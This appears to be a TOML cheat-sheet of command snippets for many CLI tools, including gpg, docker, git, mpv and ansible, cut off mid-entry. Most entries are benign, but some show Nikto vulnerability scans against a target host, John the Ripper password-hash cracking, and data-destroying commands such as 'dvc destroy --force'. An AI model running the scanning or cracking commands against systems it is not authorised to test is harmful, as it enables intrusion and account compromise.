[[snippets]]
  description = "Sign `doc.txt` without encryption (writes output to `doc.txt.asc`)"
  command = "gpg --clearsign <doc.txt>"
  output = ""

[[snippets]]
  description = "Encrypt and sign `doc.txt` for alice@example.com and bob@example.com (output to `doc.txt.gpg`)"
  command = "gpg --encrypt --sign --recipient <alice@example.com> --recipient <bob@example.com> <doc.txt>"
  output = ""

[[snippets]]
  description = "Encrypt `doc.txt` with only a passphrase (output to `doc.txt.gpg`)"
  command = "gpg --symmetric <doc.txt>"
  output = ""

[[snippets]]
  description = "Decrypt `doc.txt.gpg` (output to `stdout`)"
  command = "gpg --decrypt <doc.txt.gpg>"
  output = ""

[[snippets]]
  description = "Import a public key"
  command = "gpg --import <public.gpg>"
  output = ""

[[snippets]]
  description = "Export public key for alice@example.com (output to `stdout`)"
  command = "gpg --export --armor <alice@example.com>"
  output = ""

[[snippets]]
  description = "Export private key for alice@example.com (output to `stdout`)"
  command = "gpg --export-secret-keys --armor <alice@example.com>"
  output = ""

[[snippets]]
  description = "Start the Mixxx GUI in fullscreen"
  command = "mixxx --fullScreen"
  output = ""

[[snippets]]
  description = "Start in safe developer mode to debug a crash"
  command = "mixxx --developer --safeMode"
  output = ""

[[snippets]]
  description = "Debug a malfunction"
  command = "mixxx --debugAssertBreak --developer --loglevel trace"
  output = ""

[[snippets]]
  description = "Start Mixxx using the specified settings file"
  command = "mixxx --resourcePath <mixxx/res/controllers> --settingsPath <path/to/settings-file>"
  output = ""

[[snippets]]
  description = "Debug a custom controller mapping"
  command = "mixxx --controllerDebug --resourcePath <path/to/mapping-directory>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mixxx --help"
  output = ""

[[snippets]]
  description = "List all containers (both running and stopped)"
  command = "podman ps --all"
  output = ""

[[snippets]]
  description = "Create a container from an image, with a custom name"
  command = "podman run --name <container_name> <image>"
  output = ""

[[snippets]]
  description = "Start or stop an existing container"
  command = "podman <start|stop> <container_name>"
  output = ""

[[snippets]]
  description = "Pull an image from a registry (defaults to Docker Hub)"
  command = "podman pull <image>"
  output = ""

[[snippets]]
  description = "Display the list of already downloaded images"
  command = "podman images"
  output = ""

[[snippets]]
  description = "Open a shell inside an already running container"
  command = "podman exec --interactive --tty <container_name> <sh>"
  output = ""

[[snippets]]
  description = "Remove a stopped container"
  command = "podman rm <container_name>"
  output = ""

[[snippets]]
  description = "Display the logs of one or more containers and follow log output"
  command = "podman logs --follow <container_name> <container_id>"
  output = ""

[[snippets]]
  description = "Print the hexadecimal representation of a file"
  command = "hexyl <path/to/file>"
  output = ""

[[snippets]]
  description = "Print the hexadecimal representation of the first n bytes of a file"
  command = "hexyl -n <n> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print bytes 512 through 1024 of a file"
  command = "hexyl -r <512>:<1024> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print 512 bytes starting at the 1024th byte"
  command = "hexyl -r <1024>:+<512> <path/to/file>"
  output = ""

[[snippets]]
  description = "Start `btop`"
  command = "btop"
  output = ""

[[snippets]]
  description = "Start `btop` with the specified settings preset"
  command = "btop --preset <0..9>"
  output = ""

[[snippets]]
  description = "Open a prompt to enter an API token and label its context"
  command = "doctl auth init --context <token_label>"
  output = ""

[[snippets]]
  description = "List authentication contexts (API tokens)"
  command = "doctl auth list"
  output = ""

[[snippets]]
  description = "Switch contexts (API tokens)"
  command = "doctl auth switch --context <token_label>"
  output = ""

[[snippets]]
  description = "Remove a stored authentication context (API token)"
  command = "doctl auth remove --context <token_label>"
  output = ""

[[snippets]]
  description = "Show available commands"
  command = "doctl auth --help"
  output = ""

[[snippets]]
  description = "Create a new Redis cache instance"
  command = "az redis create --location <location> --name <name> --resource-group <resource_group> --sku <Basic|Premium|Standard> --vm-size <c0|c1|c2|c3|c4|c5|c6|p1|p2|p3|p4|p5>"
  output = ""

[[snippets]]
  description = "Update a Redis cache"
  command = "az redis update --name <name> --resource-group <resource_group> --sku <Basic|Premium|Standard> --vm-size <c0|c1|c2|c3|c4|c5|c6|p1|p2|p3|p4|p5>"
  output = ""

[[snippets]]
  description = "Export data stored in a Redis cache"
  command = "az redis export --container <container> --file-format <file-format> --name <name> --prefix <prefix> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Delete a Redis cache"
  command = "az redis delete --name <name> --resource-group <resource_group> --yes"
  output = ""

[[snippets]]
  description = "Play a video or audio from a URL or file"
  command = "mpv <url|path/to/file>'"
  output = ""

[[snippets]]
  description = "Jump backward/forward 5 seconds"
  command = "LEFT <or> RIGHT"
  output = ""

[[snippets]]
  description = "Jump backward/forward 1 minute"
  command = "DOWN <or> UP"
  output = ""

[[snippets]]
  description = "Decrease or increase playback speed by 10%"
  command = "[ <or> ]"
  output = ""

[[snippets]]
  description = "Take a screenshot of the current frame (saved to `./mpv-shotNNNN.jpg` by default)"
  command = "s"
  output = ""

[[snippets]]
  description = "Play a file at a specified speed (1 by default)"
  command = "mpv --speed <0.01..100> <path/to/file>"
  output = ""

[[snippets]]
  description = "Play a file using a profile defined in the `mpv.conf` file"
  command = "mpv --profile <profile_name> <path/to/file>"
  output = ""

[[snippets]]
  description = "Display the output of webcam or other video input device"
  command = "mpv /dev/<video0>"
  output = ""

[[snippets]]
  description = "Change all files modification time to their last commit date"
  command = "git utimes"
  output = ""

[[snippets]]
  description = "Change files modification time that are newer than their last commit date, preserving original modification time of files that were committed from the local repository"
  command = "git utimes --newer"
  output = ""

[[snippets]]
  description = "Display a human-readable summary of differences between files using a specific column as a unique identifier"
  command = "csv-diff <path/to/file1.csv> <path/to/file2.csv> --key=<column_name>"
  output = ""

[[snippets]]
  description = "Display a human-readable summary of differences between files that includes unchanged values in rows with at least one change"
  command = "csv-diff <path/to/file1.csv> <path/to/file2.csv> --key=<column_name> --show-unchanged"
  output = ""

[[snippets]]
  description = "Display a summary of differences between files in JSON format using a specific column as a unique identifier"
  command = "csv-diff <path/to/file1.csv> <path/to/file2.csv> --key=<column_name> --json"
  output = ""

[[snippets]]
  description = "Perform a basic Nikto scan against a target host"
  command = "perl nikto.pl -h <192.168.0.1>"
  output = ""

[[snippets]]
  description = "Specify the port number when performing a basic scan"
  command = "perl nikto.pl -h <192.168.0.1> -p <443>"
  output = ""

[[snippets]]
  description = "Scan ports and protocols with full URL syntax"
  command = "perl nikto.pl -h <https://192.168.0.1:443/>"
  output = ""

[[snippets]]
  description = "Scan multiple ports in the same scanning session"
  command = "perl nikto.pl -h <192.168.0.1> -p <80,88,443>"
  output = ""

[[snippets]]
  description = "Update to the latest plugins and databases"
  command = "perl nikto.pl -update"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "less <source_file>"
  output = ""

[[snippets]]
  description = "Page down/up"
  command = "<Space> (down), b (up)"
  output = ""

[[snippets]]
  description = "Go to end/start of file"
  command = "G (end), g (start)"
  output = ""

[[snippets]]
  description = "Forward search for a string (press `n`/`N` to go to next/previous match)"
  command = "/<something>"
  output = ""

[[snippets]]
  description = "Backward search for a string (press `n`/`N` to go to next/previous match)"
  command = "?<something>"
  output = ""

[[snippets]]
  description = "Follow the output of the currently opened file"
  command = "F"
  output = ""

[[snippets]]
  description = "Open the current file in an editor"
  command = "v"
  output = ""

[[snippets]]
  description = "Exit"
  command = "q"
  output = ""

[[snippets]]
  description = "Render a static image directly in the terminal"
  command = "pixterm <path/to/file>"
  output = ""

[[snippets]]
  description = "Use the image's original aspect ratio"
  command = "pixterm -s 2 <path/to/file>"
  output = ""

[[snippets]]
  description = "Specify a custom aspect ratio using a specific number of [t]erminal [r]ows and [c]olumns"
  command = "pixterm -tr <24> -tc <80> <path/to/file>"
  output = ""

[[snippets]]
  description = "Filter the output with a [m]atte background color and character [d]ithering"
  command = "pixterm -m <000000> -d 2 <path/to/file>"
  output = ""

[[snippets]]
  description = "List existing remotes with their names and URLs"
  command = "git remote -v"
  output = ""

[[snippets]]
  description = "Show information about a remote"
  command = "git remote show <remote_name>"
  output = ""

[[snippets]]
  description = "Add a remote"
  command = "git remote add <remote_name> <remote_url>"
  output = ""

[[snippets]]
  description = "Change the URL of a remote (use `--add` to keep the existing URL)"
  command = "git remote set-url <remote_name> <new_url>"
  output = ""

[[snippets]]
  description = "Show the URL of a remote"
  command = "git remote get-url <remote_name>"
  output = ""

[[snippets]]
  description = "Remove a remote"
  command = "git remote remove <remote_name>"
  output = ""

[[snippets]]
  description = "Rename a remote"
  command = "git remote rename <old_name> <new_name>"
  output = ""

[[snippets]]
  description = "Destroy the current project"
  command = "dvc destroy"
  output = ""

[[snippets]]
  description = "Force destroy the current project"
  command = "dvc destroy --force"
  output = ""

[[snippets]]
  description = "Transform an XML document using an XSL stylesheet, passing one XPATH parameter and one literal string parameter"
  command = "xml transform <path/to/stylesheet.xsl> -p ""<Count='count(/xml/table/rec)'>"" -s <Text=""Count=""> <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml transform --help"
  output = ""

[[snippets]]
  description = "Preview and deploy changes to a program and/or infrastructure"
  command = "pulumi up"
  output = ""

[[snippets]]
  description = "Automatically approve and perform the update after previewing it"
  command = "pulumi up --yes"
  output = ""

[[snippets]]
  description = "Preview and deploy changes in a specific stack"
  command = "pulumi up --stack <stack>"
  output = ""

[[snippets]]
  description = "Convert an RDF/XML document to Turtle"
  command = "rapper -i rdfxml -o turtle <path/to/file>"
  output = ""

[[snippets]]
  description = "Count the number of triples in a Turtle file"
  command = "rapper -i turtle -c <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate an SM3 hash for a file"
  command = "gmssl sm3 <path/to/file>"
  output = ""

[[snippets]]
  description = "Encrypt a file using the SM4 cipher"
  command = "gmssl sms4 -e -in <path/to/file> -out <path/to/file.sms4>"
  output = ""

[[snippets]]
  description = "Decrypt a file using the SM4 cipher"
  command = "gmssl sms4 -d -in <path/to/file.sms4>"
  output = ""

[[snippets]]
  description = "Generate an SM2 private key"
  command = "gmssl sm2 -genkey -out <path/to/file.pem>"
  output = ""

[[snippets]]
  description = "Generate an SM2 public key from an existing private key"
  command = "gmssl sm2 -pubout -in <path/to/file.pem> -out <path/to/file.pem.pub>"
  output = ""

[[snippets]]
  description = "Encrypt a file using the ZUC cipher"
  command = "gmssl zuc -e -in <path/to/file> -out <path/to/file.zuc>"
  output = ""

[[snippets]]
  description = "Decrypt a file using the ZUC cipher"
  command = "gmssl zuc -d -in <path/to/file.zuc>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "gmssl version"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr bundle"
  output = ""

[[snippets]]
  description = "Convert JSON5 `stdin` to JSON `stdout`"
  command = "echo <input> | json5"
  output = ""

[[snippets]]
  description = "Convert a JSON5 file to JSON and output to `stdout`"
  command = "json5 <path/to/input_file.json5>"
  output = ""

[[snippets]]
  description = "Convert a JSON5 file to the specified JSON file"
  command = "json5 <path/to/input_file.json5> --out-file <path/to/output_file.json>"
  output = ""

[[snippets]]
  description = "Validate a JSON5 file"
  command = "json5 <path/to/input_file.json5> --validate"
  output = ""

[[snippets]]
  description = "Specify the number of spaces to indent by (or "t" for tabs)"
  command = "json5 --space <indent_amount>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "json5 --help"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr ar"
  output = ""

[[snippets]]
  description = "Convert a YBM image file to PBM"
  command = "ybmtopbm <path/to/input_file.ybm> > <path/to/output_file.pbm>"
  output = ""

[[snippets]]
  description = "Compile a new Phar file"
  command = "box compile"
  output = ""

[[snippets]]
  description = "Compile a new Phar file using a specific [c]onfiguration file"
  command = "box compile -c <path/to/config>"
  output = ""

[[snippets]]
  description = "Display information about the PHAR PHP extension"
  command = "box info"
  output = ""

[[snippets]]
  description = "Display information about a specific Phar file"
  command = "box info <path/to/phar_file>"
  output = ""

[[snippets]]
  description = "Validate the first found configuration file in the working directory"
  command = "box validate"
  output = ""

[[snippets]]
  description = "Verify the signature of a specific Phar file"
  command = "box verify <path/to/phar_file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "box help"
  output = ""

[[snippets]]
  description = "Print PDF file information"
  command = "pdfinfo <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Specify user password for PDF file to bypass security restrictions"
  command = "pdfinfo -upw <password> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Specify owner password for PDF file to bypass security restrictions"
  command = "pdfinfo -opw <password> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Launch the spreadsheet application"
  command = "calligrasheets"
  output = ""

[[snippets]]
  description = "Open a specific spreadsheet"
  command = "calligrasheets <path/to/spreadsheet>"
  output = ""

[[snippets]]
  description = "Display help or version"
  command = "calligrasheets --<help|version>"
  output = ""

[[snippets]]
  description = "Convert a SCSS or Sass file to CSS and print out the result"
  command = "sass <inputfile.scss|inputfile.sass>"
  output = ""

[[snippets]]
  description = "Convert a SCSS or Sass file to CSS and save the result to a file"
  command = "sass <inputfile.scss|inputfile.sass> <outputfile.css>"
  output = ""

[[snippets]]
  description = "Watch a SCSS or Sass file for changes and output or update the CSS file with same filename"
  command = "sass --watch <inputfile.scss|inputfile.sass>"
  output = ""

[[snippets]]
  description = "Watch a SCSS or Sass file for changes and output or update the CSS file with the given filename"
  command = "sass --watch <inputfile.scss|inputfile.sass>:<outputfile.css>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "rbash"
  output = ""

[[snippets]]
  description = "Execute a command and then exit"
  command = "rbash -c ""<command>"""
  output = ""

[[snippets]]
  description = "Execute a script"
  command = "rbash <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute a script, printing each command before executing it"
  command = "rbash -x <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute commands from a script, stopping at the first error"
  command = "rbash -e <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Read and execute commands from `stdin`"
  command = "rbash -s"
  output = ""

[[snippets]]
  description = "Run tasks in playbook"
  command = "ansible-playbook <playbook>"
  output = ""

[[snippets]]
  description = "Run tasks in playbook with custom host [i]nventory"
  command = "ansible-playbook <playbook> -i <inventory_file>"
  output = ""

[[snippets]]
  description = "Run tasks in playbook with [e]xtra variables defined via the command-line"
  command = "ansible-playbook <playbook> -e ""<variable1>=<value1> <variable2>=<value2>"""
  output = ""

[[snippets]]
  description = "Run tasks in playbook with [e]xtra variables defined in a JSON file"
  command = "ansible-playbook <playbook> -e ""@<variables.json>"""
  output = ""

[[snippets]]
  description = "Run tasks in playbook for the given tags"
  command = "ansible-playbook <playbook> --tags <tag1,tag2>"
  output = ""

[[snippets]]
  description = "Run tasks in a playbook starting at a specific task"
  command = "ansible-playbook <playbook> --start-at <task_name>"
  output = ""

[[snippets]]
  description = "Make a virtual mosaic from all TIFF files contained in a directory"
  command = "gdalbuildvrt <path/to/output.vrt> <path/to/input_directory/*.tif>"
  output = ""

[[snippets]]
  description = "Make a virtual mosaic from files whose name is specified in a text file"
  command = "gdalbuildvrt -input_file_list <path/to/list.txt> <path/to/output.vrt>"
  output = ""

[[snippets]]
  description = "Make an RGB virtual mosaic from 3 single-band input files"
  command = "gdalbuildvrt -separate <path/to/rgb.vrt> <path/to/red.tif> <path/to/green.tif> <path/to/blue.tif>"
  output = ""

[[snippets]]
  description = "Make a virtual mosaic with blue background color (RGB: 0 0 255)"
  command = "gdalbuildvrt -hidenodata -vrtnodata ""<0 0 255>"" <path/to/output.vrt> <path/to/input_directory/*.tif>"
  output = ""

[[snippets]]
  description = "Display the current configuration values"
  command = "cupsctl"
  output = ""

[[snippets]]
  description = "Display the configuration values of a specific server"
  command = "cupsctl -h <server[:port]>"
  output = ""

[[snippets]]
  description = "Enable encryption on the connection to the scheduler"
  command = "cupsctl -E"
  output = ""

[[snippets]]
  description = "Enable or disable debug logging to the `error_log` file"
  command = "cupsctl <--debug-logging|--no-debug-logging>"
  output = ""

[[snippets]]
  description = "Enable or disable remote administration"
  command = "cupsctl <--remote-admin|--no-remote-admin>"
  output = ""

[[snippets]]
  description = "Parse the current debug logging state"
  command = "cupsctl | grep '^_debug_logging' | awk -F= '{print $2}'"
  output = ""

[[snippets]]
  description = "Show the currently selected Perl version and how it was selected"
  command = "plenv version"
  output = ""

[[snippets]]
  description = "List all available installed Perl versions"
  command = "plenv versions"
  output = ""

[[snippets]]
  description = "Set the global Perl version (used unless a local or shell version takes priority)"
  command = "plenv global <version>"
  output = ""

[[snippets]]
  description = "Set the local application-specific Perl version (used in the current directory and all directories below it)"
  command = "plenv local <version>"
  output = ""

[[snippets]]
  description = "Set the shell-specific Perl version (used for the current session only)"
  command = "plenv shell <version>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "plenv"
  output = ""

[[snippets]]
  description = "Display help for a command"
  command = "plenv help <command>"
  output = ""

[[snippets]]
  description = "Start WeeChat"
  command = "weechat"
  output = ""

[[snippets]]
  description = "Do not load any plugin(s) on startup"
  command = "weechat --no-plugin"
  output = ""

[[snippets]]
  description = "Do not load any script(s) on startup"
  command = "weechat --no-script"
  output = ""

[[snippets]]
  description = "Do not connect to servers automatically"
  command = "weechat --no-connect"
  output = ""

[[snippets]]
  description = "Write default terminal colors to `stdout`"
  command = "weechat --colors"
  output = ""

[[snippets]]
  description = "Freeze one or more specified stages"
  command = "dvc freeze <stage_name1 stage_name2 ...>"
  output = ""

[[snippets]]
  description = "Print the fully qualified package specification for the current project"
  command = "cargo pkgid"
  output = ""

[[snippets]]
  description = "Print the fully qualified package specification for the specified package"
  command = "cargo pkgid <partial_pkgspec>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "go version"
  output = ""

[[snippets]]
  description = "Display the Go version used to build a specific executable file"
  command = "go version <path/to/executable>"
  output = ""

[[snippets]]
  description = "Compile a lilypond file into a PDF"
  command = "lilypond <path/to/file>"
  output = ""

[[snippets]]
  description = "Compile into the specified format"
  command = "lilypond --formats=<format_dump> <path/to/file>"
  output = ""

[[snippets]]
  description = "Compile the specified file, suppressing progress updates"
  command = "lilypond -s <path/to/file>"
  output = ""

[[snippets]]
  description = "Compile the specified file, and also specify the output filename"
  command = "lilypond --output=<path/to/output_file> <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Show the current version of lilypond"
  command = "lilypond --version"
  output = ""

[[snippets]]
  description = "List available subcommands (or create a new project if no configuration exists)"
  command = "hardhat"
  output = ""

[[snippets]]
  description = "Compile the current project and build all artifacts"
  command = "hardhat compile"
  output = ""

[[snippets]]
  description = "Run a user-defined script after compiling the project"
  command = "hardhat run <path/to/script.js>"
  output = ""

[[snippets]]
  description = "Run Mocha tests"
  command = "hardhat test"
  output = ""

[[snippets]]
  description = "Run all given test files"
  command = "hardhat test <path/to/file1.js> <path/to/file2.js>"
  output = ""

[[snippets]]
  description = "Start a local Ethereum JSON-RPC node for development"
  command = "hardhat node"
  output = ""

[[snippets]]
  description = "Start a local Ethereum JSON-RPC node with a specific hostname and port"
  command = "hardhat node --hostname <hostname> --port <port>"
  output = ""

[[snippets]]
  description = "Clean the cache and all artifacts"
  command = "hardhat clean"
  output = ""

[[snippets]]
  description = "Connect to the server <dav.example.com>, open the root collection"
  command = "cadaver <http://dav.example.com/>"
  output = ""

[[snippets]]
  description = "Connect to a server using a specific port and open the collection `/foo/bar/`"
  command = "cadaver <http://dav.example.com:8022/foo/bar/>"
  output = ""

[[snippets]]
  description = "Connect to a server using SSL"
  command = "cadaver <https://davs.example.com/>"
  output = ""

[[snippets]]
  description = "List all notes and the objects they are attached to"
  command = "git notes list"
  output = ""

[[snippets]]
  description = "List all notes attached to a given object (defaults to HEAD)"
  command = "git notes list [<object>]"
  output = ""

[[snippets]]
  description = "Show the notes attached to a given object (defaults to HEAD)"
  command = "git notes show [<object>]"
  output = ""

[[snippets]]
  description = "Append a note to a specified object (opens the default text editor)"
  command = "git notes append <object>"
  output = ""

[[snippets]]
  description = "Append a note to a specified object, specifying the message"
  command = "git notes append --message=""<message_text>"""
  output = ""

[[snippets]]
  description = "Edit an existing note (defaults to HEAD)"
  command = "git notes edit [<object>]"
  output = ""

[[snippets]]
  description = "Copy a note from one object to another"
  command = "git notes copy <source_object> <target_object>"
  output = ""

[[snippets]]
  description = "Remove all the notes added to a specified object"
  command = "git notes remove <object>"
  output = ""

[[snippets]]
  description = "Repeatedly output "message""
  command = "yes <message>"
  output = ""

[[snippets]]
  description = "Repeatedly output "y""
  command = "yes"
  output = ""

[[snippets]]
  description = "Accept everything prompted by the `apt-get` command"
  command = "yes | sudo apt-get install <program>"
  output = ""

[[snippets]]
  description = "Repeatedly output a newline to always accept the default option of a prompt"
  command = "yes ''"
  output = ""

[[snippets]]
  description = "List currently running docker containers"
  command = "docker ps"
  output = ""

[[snippets]]
  description = "List all docker containers (running and stopped)"
  command = "docker ps --all"
  output = ""

[[snippets]]
  description = "Show the latest created container (includes all states)"
  command = "docker ps --latest"
  output = ""

[[snippets]]
  description = "Filter containers that contain a substring in their name"
  command = "docker ps --filter=""name=<name>"""
  output = ""

[[snippets]]
  description = "Filter containers that share a given image as an ancestor"
  command = "docker ps --filter ""ancestor=<image>:<tag>"""
  output = ""

[[snippets]]
  description = "Filter containers by exit status code"
  command = "docker ps --all --filter=""exited=<code>"""
  output = ""

[[snippets]]
  description = "Filter containers by status (created, running, removing, paused, exited and dead)"
  command = "docker ps --filter=""status=<status>"""
  output = ""

[[snippets]]
  description = "Filter containers that mount a specific volume or have a volume mounted in a specific path"
  command = "docker ps --filter=""volume=<path/to/directory>"" --format ""table <.ID>\t<.Image>\t<.Names>\t<.Mounts>"""
  output = ""

[[snippets]]
  description = "Reset all tracked files and delete all untracked files even if they are included in the `.gitignore`"
  command = "git clear"
  output = ""

[[snippets]]
  description = "Run a command on a CSV file with a custom delimiter"
  command = "<command> -d <delimiter> <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Run a command on a CSV file with a tab as a delimiter (overrides -d)"
  command = "<command> -t <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Run a command on a CSV file with a custom quote character"
  command = "<command> -q <quote_char> <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Run a command on a CSV file with no header row"
  command = "<command> -H <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "d8"
  output = ""

[[snippets]]
  description = "Run a JavaScript file"
  command = "d8 <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Evaluate a JavaScript expression"
  command = "d8 -e ""<code>"
  output = ""

[[snippets]]
  description = "Switch to directory and push it on the stack"
  command = "pushd <path/to/directory>"
  output = ""

[[snippets]]
  description = "Switch first and second directories on the stack"
  command = "pushd"
  output = ""

[[snippets]]
  description = "Rotate stack by making the 5th element the top of the stack"
  command = "pushd +4"
  output = ""

[[snippets]]
  description = "Rotate the stack 4 times to the left (the current directory stays at the top by replacing the 5th element)"
  command = "pushd -n +4"
  output = ""

[[snippets]]
  description = "View documentation for `pamscale`"
  command = "tldr pamscale"
  output = ""

[[snippets]]
  description = "Share files or directories"
  command = "airshare <code> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Receive a file"
  command = "airshare <code>"
  output = ""

[[snippets]]
  description = "Host a receiving server (use this to be able to upload files using the web interface)"
  command = "airshare --upload <code>"
  output = ""

[[snippets]]
  description = "Send files or directories to a receiving server"
  command = "airshare --upload <code> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Send files whose paths have been copied to the clipboard"
  command = "airshare --file-path <code>"
  output = ""

[[snippets]]
  description = "Receive a file and copy it to the clipboard"
  command = "airshare --clip-receive <code>"
  output = ""

[[snippets]]
  description = "Check the consistency of the whole TeX Live installation"
  command = "tlmgr check all"
  output = ""

[[snippets]]
  description = "Check the consistency of the whole TeX Live information in verbose mode"
  command = "tlmgr check all -v"
  output = ""

[[snippets]]
  description = "Check for missing dependencies"
  command = "tlmgr check depends"
  output = ""

[[snippets]]
  description = "Check if all TeX Live executables are present"
  command = "tlmgr check executes"
  output = ""

[[snippets]]
  description = "Check if all files listed in the local TLPDB are present"
  command = "tlmgr check files"
  output = ""

[[snippets]]
  description = "Check for duplicate filenames in the runfiles sections"
  command = "tlmgr check runfiles"
  output = ""

[[snippets]]
  description = "View documentation for the command runner"
  command = "tldr just.1"
  output = ""

[[snippets]]
  description = "View documentation for the V8 JavaScript runtime"
  command = "tldr just.js"
  output = ""

[[snippets]]
  description = "Create and switch to a new branch"
  command = "git checkout -b <branch_name>"
  output = ""

[[snippets]]
  description = "Create and switch to a new branch based on a specific reference (branch, remote/branch, tag are examples of valid references)"
  command = "git checkout -b <branch_name> <reference>"
  output = ""

[[snippets]]
  description = "Switch to an existing local branch"
  command = "git checkout <branch_name>"
  output = ""

[[snippets]]
  description = "Switch to the previously checked out branch"
  command = "git checkout -"
  output = ""

[[snippets]]
  description = "Switch to an existing remote branch"
  command = "git checkout --track <remote_name>/<branch_name>"
  output = ""

[[snippets]]
  description = "Discard all unstaged changes in the current directory (see `git reset` for more undo-like commands)"
  command = "git checkout ."
  output = ""

[[snippets]]
  description = "Discard unstaged changes to a given file"
  command = "git checkout <path/to/file>"
  output = ""

[[snippets]]
  description = "Replace a file in the current directory with the version of it committed in a given branch"
  command = "git checkout <branch_name> -- <path/to/file>"
  output = ""

[[snippets]]
  description = "Crack password hashes"
  command = "john <path/to/hashes.txt>"
  output = ""

[[snippets]]
  description = "Show passwords cracked"
  command = "john --show <path/to/hashes.txt>"
  output = ""

[[snippets]]
  description = "Display users' cracked passwords by user identifier from multiple files"
  command = "john --show --users=<user_ids> <path/to/hashes1.txt path/to/hashes2.txt ...>"
  output = ""

[[snippets]]
  description = "Crack password hashes, using a custom wordlist"
  command = "john --wordlist=<path/to/wordlist.txt> <path/to/hashes.txt>"
  output = ""

[[snippets]]
  description = "List available hash formats"
  command = "john --list=formats"
  output = ""

[[snippets]]
  description = "Crack password hashes, using a specific hash format"
  command = "john --format=<md5crypt> <path/to/hashes.txt>"
  output = ""

[[snippets]]
  description = "Crack password hashes, enabling word mangling rules"
  command = "john --rules <path/to/hashes.txt>"
  output = ""

[[snippets]]
  description = "Restore an interrupted cracking session from a state file, e.g. `mycrack.rec`"
  command = "john --restore=<path/to/mycrack.rec>"
  output = ""

[[snippets]]
  description = "Ask a generic question"
  command = "mods ""<write me a poem about platypuses>"""
  output = ""

[[snippets]]
  description = "Open settings in your `$EDITOR`"
  command = "mods --settings"
  output = ""

[[snippets]]
  description = "Ask for comments on your code, in markdown format"
  command = "mods --format ""<what are your thoughts on improving this code?>"" < <path/to/file>"
  output = ""

[[snippets]]
  description = "Ask for help with your documentation, in markdown format"
  command = "mods --format ""<write a new section to this readme for a feature that sends you a free rabbit if you hit r>"" < <README.md>"
  output = ""

[[snippets]]
  description = "Organize your videos, in markdown format"
  command = "ls <path/to/videos> | mods --format ""<organize these by decade and summarize>"""
  output = ""

[[snippets]]
  description = "Read through raw HTML and summarize the contents, in markdown format"
  command = "curl ""<https://api.open-meteo.com/v1/forecast?latitude=29.00&longitude=-90.00&current_weather=true&hourly=temperature_2m,relativehumidity_2m,windspeed_10m>"" | mods --format ""<summarize this weather data for a human>"""
  output = ""

[[snippets]]
  description = "Display help"
  command = "mods --help"
  output = ""

[[snippets]]
  description = "Update restart policy to apply when a specific container exits"
  command = "docker update --restart=<always|no|on-failure|unless-stopped> <container_name>"
  output = ""

[[snippets]]
  description = "Update the policy to restart up to three times a specific container when it exits with non-zero exit status"
  command = "docker update --restart=on-failure:3 <container_name>"
  output = ""

[[snippets]]
  description = "Update the number of CPUs available to a specific container"
  command = "docker update --cpus <count> <container_name>"
  output = ""

[[snippets]]
  description = "Update the memory limit in [M]egabytes for a specific container"
  command = "docker update --memory <limit>M <container_name>"
  output = ""

[[snippets]]
  description = "Update the maximum number of process IDs allowed inside a specific container (use `-1` for unlimited)"
  command = "docker update --pids-limit <count> <container_name>"
  output = ""

[[snippets]]
  description = "Update the amount of memory in [M]egabytes a specific container can swap to disk (use `-1` for unlimited)"
  command = "docker update --memory-swap <limit>M <container_name>"
  output = ""

[[snippets]]
  description = "Build a docker image using the Dockerfile in the current directory"
  command = "docker build ."
  output = ""

[[snippets]]
  description = "Build a docker image from a Dockerfile at a specified URL"
  command = "docker build <github.com/creack/docker-firefox>"
  output = ""

[[snippets]]
  description = "Build a docker image and tag it"
  command = "docker build --tag <name:tag> ."
  output = ""

[[snippets]]
  description = "Build a docker image with no build context"
  command = "docker build --tag <name:tag> - < <Dockerfile>"
  output = ""

[[snippets]]
  description = "Do not use the cache when building the image"
  command = "docker build --no-cache --tag <name:tag> ."
  output = ""

[[snippets]]
  description = "Build a docker image using a specific Dockerfile"
  command = "docker build --file <Dockerfile> ."
  output = ""

[[snippets]]
  description = "Build with custom build-time variables"
  command = "docker build --build-arg <HTTP_PROXY=http://10.20.30.2:1234> --build-arg <FTP_PROXY=http://40.50.60.5:4567> ."
  output = ""

[[snippets]]
  description = "Run in interactive mode"
  command = "units"
  output = ""

[[snippets]]
  description = "List all units containing a specific string in interactive mode"
  command = "search <string>"
  output = ""

[[snippets]]
  description = "Show the conversion between two simple units"
  command = "units <quarts> <tablespoons>"
  output = ""

[[snippets]]
  description = "Convert between units with quantities"
  command = "units ""<15 pounds>"" <kilograms>"
  output = ""

[[snippets]]
  description = "Show the conversion between two compound units"
  command = "units ""<meters / second>"" ""<inches / hour>"""
  output = ""

[[snippets]]
  description = "Show the conversion between units with different dimensions"
  command = "units ""<acres>"" ""<ft^2>"""
  output = ""

[[snippets]]
  description = "Show the conversion of byte multipliers"
  command = "units ""<15 megabytes>"" <bytes>"
  output = ""

[[snippets]]
  description = "Resolve lists of transitive dependencies of two dependencies"
